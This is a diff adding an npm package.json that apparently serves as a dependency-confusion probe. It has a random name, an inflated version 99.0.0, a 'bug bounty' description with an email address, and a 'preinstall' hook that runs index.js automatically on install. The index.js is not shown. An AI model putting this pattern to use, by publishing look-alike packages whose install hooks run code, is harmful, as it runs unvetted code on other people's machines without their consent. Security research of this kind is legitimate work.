@@ -1,0 +1,12 @@
+{
+  "name": "alksjdaskldjklj12kl3jkl12jkljaskldjaklsjdlkashjflksdjhfgkldsjlkgop123i4poiopals",
+  "version": "99.0.0",
+  "description": "v4yne1 [at] gmail.com bug bounty",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node index.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
